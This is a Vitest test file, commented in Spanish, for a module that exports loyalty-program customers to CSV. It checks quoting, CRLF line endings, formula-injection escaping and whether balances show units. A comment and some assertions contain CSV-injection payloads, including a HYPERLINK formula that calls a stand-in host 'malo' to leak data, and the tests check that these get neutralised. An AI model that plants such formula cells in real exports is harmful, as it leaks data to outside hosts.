import { describe, it, expect, afterEach } from 'vitest';
import { createServiceClient } from '../supabase/server';
import { crearEntorno } from '../../test/fixtures/entornoComercio';
import { escaparCelda, generarCsv, filasParaExportar } from './exportarClientes';

// Dos mitades: el formateador PURO (lo que rompe un CSV en la práctica) y el RECORRIDO contra la
// base, que es donde se decide en qué unidad va cada saldo. La segunda existe porque la primera,
// sola, pasaba en verde con la consulta mandando el entero crudo — ver el comentario de su bloque.

describe('escaparCelda', () => {
  it('neutraliza las celdas que Excel ejecutaría como fórmula', () => {
    // CSV injection. El archivo lo abre el DUEÑO en su computadora, confiando en él, así que una
    // celda como =HYPERLINK("http://malo/"&A1) convierte su propio export en un exfiltrador de su
    // base de clientes. El apóstrofo le dice a Excel "esto es texto" y no se muestra.
    expect(escaparCelda('=1+1')).toBe('"\'=1+1"');
    expect(escaparCelda('=HYPERLINK("http://malo/")')).toBe('"\'=HYPERLINK(""http://malo/"")"');
    expect(escaparCelda('+34600000000')).toBe('"\'+34600000000"');
    expect(escaparCelda('-2')).toBe('"\'-2"');
    expect(escaparCelda('@usuario')).toBe('"\'@usuario"');
  });

  it('no toca un nombre normal', () => {
    expect(escaparCelda('José Pérez')).toBe('"José Pérez"');
  });

  it('duplica las comillas dobles, como manda RFC 4180', () => {
    expect(escaparCelda('Juan "el Flaco"')).toBe('"Juan ""el Flaco"""');
  });

  it('entrecomilla siempre, aunque no haya comas', () => {
    // Un campo entrecomillado de más es válido; uno de menos corre TODAS las columnas cuando el
    // nombre trae una coma. Se prefiere el error inofensivo.
    expect(escaparCelda('Ana')).toBe('"Ana"');
    expect(escaparCelda('Pérez, Ana')).toBe('"Pérez, Ana"');
  });

  it('sobrevive a saltos de línea dentro de un campo', () => {
    expect(escaparCelda('linea1\nlinea2')).toBe('"linea1\nlinea2"');
  });

  it('trata null, undefined y vacío como celda vacía', () => {
    expect(escaparCelda(null)).toBe('""');
    expect(escaparCelda(undefined)).toBe('""');
    expect(escaparCelda('')).toBe('""');
  });

  it('convierte números sin marcarlos como peligrosos', () => {
    expect(escaparCelda(0)).toBe('"0"');
    expect(escaparCelda(42)).toBe('"42"');
    // Un número NEGATIVO sí empieza con '-', así que se escapa. Es feo pero correcto: preferimos un
    // apóstrofo visible en un caso rarísimo (un saldo negativo no debería existir) antes que dejar
    // pasar el vector.
    expect(escaparCelda(-1)).toBe('"\'-1"');
  });
});

describe('generarCsv', () => {
  it('arma encabezado y filas separados por CRLF', () => {
    // CRLF y no LF: es lo que dice RFC 4180 y lo que Excel en Windows espera.
    const csv = generarCsv([
      { nombre: 'Ana', telefono: '+50377771234', tarjeta: 'Principal', saldo: '3 sellos', visitas: 5, alta: '2026-07-01' },
    ]);
    const lineas = csv.split('\r\n');
    expect(lineas).toHaveLength(2);
    expect(lineas[0]).toBe('"Nombre","Teléfono","Tarjeta","Saldo","Visitas","Cliente desde"');
    // El teléfono sale con apóstrofo, y eso es CORRECTO, no un efecto colateral: todo teléfono
    // canónico empieza con '+' y cae en el escape. En Excel y Google Sheets el apóstrofo inicial es
    // un marcador de "esto es texto" que NO se muestra — y es justamente lo que evita que Excel
    // convierta +50377771234 en el número 50377771234 y se coma el signo. Sin él, la columna más
    // importante del export llegaría mutilada.
    expect(lineas[1]).toBe(`"Ana","'+50377771234","Principal","3 sellos","5","2026-07-01"`);
  });

  it('con cero clientes deja solo el encabezado', () => {
    // Un archivo vacío del todo le haría pensar al dueño que la descarga falló.
    expect(generarCsv([]).split('\r\n')).toHaveLength(1);
  });

  it('una fila con una coma en el nombre no corre las columnas', () => {
    const csv = generarCsv([
      { nombre: 'Pérez, Ana', telefono: '+50370000000', tarjeta: 'Principal', saldo: '1 sello', visitas: 1, alta: '2026-07-01' },
    ]);
    // Seis campos entrecomillados: si el escape fallara, el nombre partiría la fila en siete.
    expect(csv.split('\r\n')[1].match(/","/g)).toHaveLength(5);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// La unidad y el programa en el CSV (2026-08-07)
// ─────────────────────────────────────────────────────────────────────────────
// El export mandaba `puntos_actuales` crudo bajo una columna llamada "Saldo", sin unidad. Es el
// mismo defecto que ya se cerró en el pase, el escáner, los reportes y el portal — pero acá el
// archivo lo abre el DUEÑO en su computadora y toma decisiones de negocio con él.
describe('el CSV dice en qué moneda está cada saldo', () => {
  it('un saldo en dinero se lee en dólares, no como un entero pelado', () => {
    // 1250 en la columna son $12.50. Exportar "1250" bajo el título "Saldo" no es ambiguo: es
    // falso, y por un factor de cien.
    const csv = generarCsv([
      { nombre: 'Ana', telefono: '+50377771234', tarjeta: 'Gift card', saldo: '$12.50', visitas: 2, alta: '2026-07-01' },
    ]);
    expect(csv.split('\r\n')[1]).toContain('$12.50');
  });

  it('cada fila dice a QUÉ tarjeta pertenece', () => {
    // Un comercio puede tener dos programas activos a la vez. Sin esta columna, la fila de alguien
    // con 8 sellos y la de alguien con $8.00 de saldo se ven idénticas en la hoja de cálculo.
    const csv = generarCsv([
      { nombre: 'Ana', telefono: '+50377771234', tarjeta: 'Sellos del café', saldo: '8 sellos', visitas: 8, alta: '2026-07-01' },
    ]);
    const lineas = csv.split('\r\n');
    expect(lineas[0]).toContain('Tarjeta');
    expect(lineas[1]).toContain('Sellos del café');
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// El RECORRIDO, contra la base real
// ─────────────────────────────────────────────────────────────────────────────
// Las pruebas de arriba son del formateador puro y NO alcanzan: se las alimenta con un saldo ya
// formateado, así que pasan igual aunque `filasParaExportar` mande el entero crudo. Se comprobó con
// una mutación —reemplazar describirCosto por String(puntos_actuales) las dejó las 12 en verde— y
// por eso existe este bloque. El defecto vive en la CONSULTA, no en el formateador.
describe('filasParaExportar (contra la base)', () => {
  const supabase = createServiceClient();
  const entorno = crearEntorno(supabase);

  afterEach(async () => {
    await entorno.limpiar();
  });

  it('un saldo en centavos sale en dólares, y la fila dice de qué tarjeta es', async () => {
    const comercioId = await entorno.crearComercio({ tipo_tarjeta: 'gift_card' });
    // 1250 en la columna son $12.50.
    await entorno.crearTarjeta(comercioId, 1250);

    const filas = await filasParaExportar(supabase, comercioId);

    expect(filas).toHaveLength(1);
    expect(filas![0].saldo, 'exportó el entero crudo: $12.50 se lee como 1250').toBe('$12.50');
    expect(filas![0].tarjeta.length, 'la fila no dice a qué tarjeta pertenece').toBeGreaterThan(0);
  });

  it('en sellos sale contado en sellos', async () => {
    // La otra mitad: si TODO saliera formateado como dinero, la prueba de arriba pasaría igual.
    const comercioId = await entorno.crearComercio({ tipo_tarjeta: 'sellos' });
    await entorno.crearTarjeta(comercioId, 8);

    const filas = await filasParaExportar(supabase, comercioId);

    expect(filas![0].saldo).toBe('8 sellos');
  });
});
